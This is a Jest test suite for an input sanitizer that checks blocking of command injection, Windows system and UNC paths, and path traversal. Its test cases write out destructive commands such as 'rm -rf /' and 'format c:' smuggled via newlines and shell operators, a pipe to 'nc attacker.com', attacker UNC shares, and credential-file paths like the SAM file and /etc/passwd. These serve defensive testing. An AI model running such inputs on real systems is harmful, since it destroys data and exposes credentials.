/**
 * Edge Case Security Fixes Test Suite
 *
 * Tests for the 3 specific edge cases that were previously failing:
 * 1. Newline command injection: `ls\nrm -rf /` becomes `lsrm -rf /` (not caught)
 * 2. Windows path: `C:\Windows\System32\config\sam` (not blocked)
 * 3. UNC path: `\\attacker.com\share\malicious` (not blocked)
 */

const MCPSanitizer = require('../src/index')

describe('Edge Case Security Fixes', () => {
  let sanitizer

  beforeEach(() => {
    sanitizer = new MCPSanitizer('STRICT')
  })

  describe('Fix 1: Newline Command Injection Prevention', () => {
    it('should block newline command injection (ls\\nrm -rf /)', () => {
      const result = sanitizer.sanitize('ls\nrm -rf /', { type: 'command' })
      expect(result.blocked).toBe(true)
      expect(result.warnings.some(w => w.includes('Dangerous command detected'))).toBe(true)
    })

    it('should block carriage return command injection', () => {
      const result = sanitizer.sanitize('ls\rrm -rf /', { type: 'command' })
      expect(result.blocked).toBe(true)
    })

    it('should block CRLF command injection', () => {
      const result = sanitizer.sanitize('ls\r\nrm -rf /', { type: 'command' })
      expect(result.blocked).toBe(true)
    })

    it('should replace newlines with spaces to prevent concatenation', () => {
      // Safe command that should be allowed but with newline
      const result = sanitizer.sanitize('echo hello\nworld', { type: 'command' })
      expect(result.blocked).toBe(false)
      expect(result.sanitized).toContain('echo hello world')
    })

    it('should detect dangerous commands after newline normalization', () => {
      const dangerousCommands = [
        'ls\nrm -rf /',
        'pwd\ndel *.*',
        'whoami\nformat c:',
        'date\ndd if=/dev/zero'
      ]

      dangerousCommands.forEach(cmd => {
        const result = sanitizer.sanitize(cmd, { type: 'command' })
        expect(result.blocked).toBe(true)
      })
    })
  })

  describe('Fix 2: Windows System Path Blocking', () => {
    it('should block C:\\Windows\\System32\\config\\sam', () => {
      const result = sanitizer.sanitize('C:\\Windows\\System32\\config\\sam', { type: 'file_path' })
      expect(result.blocked).toBe(true)
      expect(result.warnings.some(w => w.includes('system directory'))).toBe(true)
    })

    it('should block various Windows system paths', () => {
      const windowsPaths = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\System32\\config\\sam',
        'C:\\Program Files\\sensitive\\data',
        'c:\\windows\\system32\\config\\sam', // lowercase
        'C:/Windows/System32/config/sam' // forward slashes
      ]

      windowsPaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        expect(result.blocked).toBe(true)
      })
    })

    it('should handle mixed path separators', () => {
      const mixedPaths = [
        'C:\\Windows/System32\\config/sam',
        'C:/Windows\\System32/config\\sam'
      ]

      mixedPaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        expect(result.blocked).toBe(true)
      })
    })
  })

  describe('Fix 3: UNC Path Blocking', () => {
    it('should block \\\\attacker.com\\share\\malicious', () => {
      const result = sanitizer.sanitize('\\\\attacker.com\\share\\malicious', { type: 'file_path' })
      expect(result.blocked).toBe(true)
    })

    it('should block various UNC path formats', () => {
      const uncPaths = [
        '\\\\server\\share\\file',
        '\\\\192.168.1.1\\c$\\windows',
        '\\\\attacker.com\\admin$\\system32',
        '\\\\evil.domain\\share\\payload.exe'
      ]

      uncPaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        expect(result.blocked).toBe(true)
      })
    })

    it('should detect UNC paths after normalization', () => {
      // Test encoded UNC paths that become UNC after decoding
      const encodedUncPaths = [
        '%5c%5cserver%5cshare%5cfile',
        '\\u005c\\u005cserver\\u005cshare'
      ]

      encodedUncPaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        expect(result.blocked).toBe(true)
      })
    })
  })

  describe('Industry Standard Library Integration', () => {
    it('should use shell-quote for command validation', () => {
      // Test complex shell injection that shell-quote should detect
      const complexInjections = [
        'ls; rm -rf /',
        'ls && rm -rf /',
        'ls | nc attacker.com 1234',
        'ls $(rm -rf /)',
        'ls `rm -rf /`'
      ]

      complexInjections.forEach(cmd => {
        const result = sanitizer.sanitize(cmd, { type: 'command' })
        expect(result.blocked).toBe(true)
      })
    })

    it('should use path-is-inside for path validation', () => {
      // Test paths that try to escape safe directories
      const unsafePaths = [
        '../../../etc/passwd',
        './uploads/../../../etc/passwd',
        '/home/user/../../../etc/passwd'
      ]

      unsafePaths.forEach(path => {
        const result = sanitizer.sanitize(path, { type: 'file_path' })
        expect(result.blocked).toBe(true)
      })
    })
  })

  describe('Comprehensive Attack Vector Prevention', () => {
    it('should prevent all known bypass techniques', () => {
      const bypassAttempts = [
        // Command injection variants
        { input: 'ls\nrm -rf /', type: 'command', name: 'newline injection' },
        { input: 'ls\rrm -rf /', type: 'command', name: 'carriage return injection' },
        { input: 'ls\trm -rf /', type: 'command', name: 'tab injection' },

        // Windows system paths
        { input: 'C:\\Windows\\System32\\config\\sam', type: 'file_path', name: 'Windows SAM file' },
        { input: 'C:\\System32\\drivers\\etc\\hosts', type: 'file_path', name: 'Windows hosts file' },

        // UNC paths
        { input: '\\\\attacker.com\\share\\malicious', type: 'file_path', name: 'UNC path' },
        { input: '\\\\192.168.1.1\\c$\\', type: 'file_path', name: 'UNC admin share' },

        // Encoded variants
        { input: 'ls%0arm -rf /', type: 'command', name: 'URL-encoded newline' },
        { input: 'C%3a%5cWindows%5cSystem32', type: 'file_path', name: 'URL-encoded Windows path' },
        { input: '%5c%5cserver%5cshare', type: 'file_path', name: 'URL-encoded UNC' }
      ]

      bypassAttempts.forEach(attempt => {
        const result = sanitizer.sanitize(attempt.input, { type: attempt.type })
        expect(result.blocked).toBe(true, `Failed to block ${attempt.name}: ${attempt.input}`)
      })
    })
  })

  describe('Performance with Security Fixes', () => {
    it('should maintain good performance with security enhancements', () => {
      const startTime = Date.now()

      // Test 100 iterations of each fix
      for (let i = 0; i < 100; i++) {
        sanitizer.sanitize('ls\nrm -rf /', { type: 'command' })
        sanitizer.sanitize('C:\\Windows\\System32\\config\\sam', { type: 'file_path' })
        sanitizer.sanitize('\\\\attacker.com\\share\\malicious', { type: 'file_path' })
      }

      const elapsed = Date.now() - startTime
      expect(elapsed).toBeLessThan(1000) // Should process 300 inputs in < 1000ms (adjusted for console warnings)
    })

    it('should efficiently handle safe inputs', () => {
      const startTime = Date.now()

      for (let i = 0; i < 100; i++) {
        sanitizer.sanitize('echo hello world', { type: 'command' })
        sanitizer.sanitize('./safe/path/file.txt', { type: 'file_path' })
        sanitizer.sanitize('SELECT * FROM users', { type: 'sql' })
      }

      const elapsed = Date.now() - startTime
      expect(elapsed).toBeLessThan(500) // Safe inputs should be fast (adjusted for any processing overhead)
    })
  })
})
